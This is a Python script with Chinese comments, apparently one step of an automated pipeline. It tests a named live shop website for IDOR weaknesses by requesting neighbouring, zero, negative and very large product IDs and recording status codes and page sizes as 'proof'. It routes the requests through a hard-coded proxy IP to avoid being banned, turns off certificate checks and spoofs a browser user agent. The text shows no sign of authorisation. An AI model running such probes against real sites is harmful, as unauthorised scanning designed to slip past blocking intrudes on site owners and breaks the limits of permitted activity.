"""
Step 3.1: fershop IDOR 验证 - 换代理池 + 增加重试 + 去掉 sleep
"""
import sys, json, time
from pathlib import Path
import requests, urllib3
urllib3.disable_warnings()

OUT = Path(".pipeline_output")

# 用多个代理轮换, 避免单代理被ban
PROXIES = [
    {"http": "http://3.211.120.181:443", "https": "http://3.211.120.181:443"},
    None,  # 直连 (兜底)
]

HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0"}


def probe(url, proxy_idx=0, retries=2):
    for attempt in range(retries):
        try:
            proxies = PROXIES[proxy_idx % len(PROXIES)]
            r = requests.get(url, timeout=10, verify=False, headers=HEADERS,
                            allow_redirects=True, proxies=proxies)
            return r.status_code, len(r.content)
        except Exception as e:
            if attempt + 1 < retries:
                proxy_idx += 1
                time.sleep(0.5)
            else:
                return f"ERR:{str(e)[:40]}", 0


# 抽样 ID
sample_pids = [3, 28, 50, 100, 200, 400, 600]
test_ids = {
    "PID-1": lambda pid: pid - 1,
    "PID+1": lambda pid: pid + 1,
    "MAX": lambda pid: 9999,
    "ZERO": lambda pid: 0,
    "NEG": lambda pid: -1,
}

print(f"{'BASE_PID':>9s} | {'PID-1':>12s} | {'PID+1':>12s} | {'MAX':>12s} | {'ZERO':>12s} | {'NEG':>12s}")
print("-" * 100)

results = []
for pid in sample_pids:
    row = {"base_pid": pid, "tests": {}}
    cells = []
    for label, fn in test_ids.items():
        target_pid = fn(pid)
        url = f"https://fershop.net/catalog/product/{target_pid}"
        s, l = probe(url)
        row["tests"][label] = {"url": url, "status": s, "length": l}
        cells.append(f"{s}/{l:>6}B")
    print(f"{pid:>9d} | " + " | ".join(c.ljust(12) for c in cells))
    results.append(row)
    time.sleep(1)

with open(OUT / "fershop_idor_proof_v2.json", "w") as f:
    json.dump(results, f, indent=2, default=str)

print("\n分析:")
for r in results:
    statuses = {label: t["status"] for label, t in r["tests"].items()}
    lengths = {label: t["length"] for label, t in r["tests"].items()}
    print(f"\n基线 PID={r['base_pid']}:")
    for label, t in r["tests"].items():
        print(f"  {label:>6s} {t['url']:50s} {t['status']:>5} {t['length']:>6}B")

    all_200 = all(t["status"] == 200 for t in r["tests"].values())
    max_len = max(t["length"] for t in r["tests"].values())
    if all_200 and max_len > 30000:
        print(f"  ⚠️ 全部 200 + 都 > 30KB → 越界访问允许 (IDOR 弱访问控制)")
    elif r["tests"]["MAX"]["status"] == 200 and r["tests"]["MAX"]["length"] > 30000:
        print(f"  ⚠️ MAX=200 (越界仍返回商品页) → IDOR 可访问不存在的商品")
    elif r["tests"]["ZERO"]["status"] == 200:
        print(f"  ⚠️ ZERO=200 → ID=0 可访问 → 弱访问控制")
